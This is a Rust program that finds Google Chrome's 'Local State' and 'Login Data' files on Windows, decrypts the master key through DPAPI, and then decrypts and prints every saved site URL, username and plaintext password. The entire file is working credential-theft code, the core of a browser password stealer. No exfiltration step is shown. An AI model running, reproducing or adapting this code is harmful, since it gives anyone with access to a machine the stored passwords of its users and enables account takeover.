use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::prelude::*;
use rusqlite::Connection;
use serde::{Deserialize, Serialize};
use std::{error::Error, fs, path::PathBuf, ptr::null_mut};
use winapi::um::wincrypt::CRYPTOAPI_BLOB;

#[derive(Serialize, Deserialize)]
struct LocalState {
    os_crypt: OsCrypt,
}

#[derive(Serialize, Deserialize)]
struct OsCrypt {
    encrypted_key: String,
}
#[derive(Debug)]
struct LoginEntry {
    url: String,
    username: String,
    encrypted_password: Vec<u8>,
}

fn get_master_key(local_state_path: PathBuf) -> Result<Vec<u8>, Box<dyn Error>> {
    let text = fs::read_to_string(local_state_path)?;
    let local_state: LocalState = serde_json::from_str(&text)?;
    let mut encrypted_key =
        BASE64_STANDARD.decode(local_state.os_crypt.encrypted_key)?[5..].to_owned();

    unsafe {
        let mut blob = CRYPTOAPI_BLOB {
            cbData: encrypted_key.len() as u32,
            pbData: encrypted_key.as_mut_ptr(),
        };
        let mut out = CRYPTOAPI_BLOB {
            cbData: 0,
            pbData: &mut 0,
        };
        let _ = winapi::um::dpapi::CryptUnprotectData(
            &mut blob,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            &mut out,
        );
        Ok(Vec::from_raw_parts(
            out.pbData,
            out.cbData as usize,
            out.cbData as usize,
        ))
    }
}

fn generate_cipher(master_key: Vec<u8>) -> Result<Aes256Gcm, Box<dyn Error>> {
    let key: [u8; 32] = master_key[0..32].try_into()?;
    let key: Key<Aes256Gcm> = key.into();
    let cipher = Aes256Gcm::new(&key);
    Ok(cipher)
}

fn decrypt_password(
    encrypted_password: Vec<u8>,
    master_key: &[u8],
) -> Result<String, Box<dyn Error>> {
    let cipher = generate_cipher(master_key.to_vec())?;
    let nonce: [u8; 12] = encrypted_password[3..15].try_into()?;
    let nonce = Nonce::from(nonce);
    let payload = &encrypted_password[15..];
    let decrypted = cipher.decrypt(&nonce, payload)?;
    Ok(std::str::from_utf8(&decrypted)?.to_string())
}

fn main() {
    let local_state_path =
        &*shellexpand::tilde("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
    let login_data_path =
        &*shellexpand::tilde("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
    let temp_login_data_path = std::env::temp_dir().join("Login Data.db");
    std::fs::copy(login_data_path, &temp_login_data_path).unwrap();

    let master_key = get_master_key(local_state_path.into()).unwrap();

    let login_data = Connection::open(temp_login_data_path).unwrap();
    let mut command = login_data
        .prepare("SELECT signon_realm, username_value, password_value FROM logins")
        .unwrap();

    let login_entries = command
        .query_map([], |row| {
            Ok(LoginEntry {
                url: row.get(0).unwrap(),
                username: row.get(1).unwrap(),
                encrypted_password: row.get(2).unwrap(),
            })
        })
        .unwrap();

    for login in login_entries.flatten() {
        let password = decrypt_password(login.encrypted_password, &master_key).unwrap();
        if login.username.is_empty() && password.is_empty() && login.url.is_empty() {
            continue;
        }
        println!(
            "{}\n\tUsername: {}\n\tPassword: {}\n",
            login.url, login.username, password
        );
    }
}
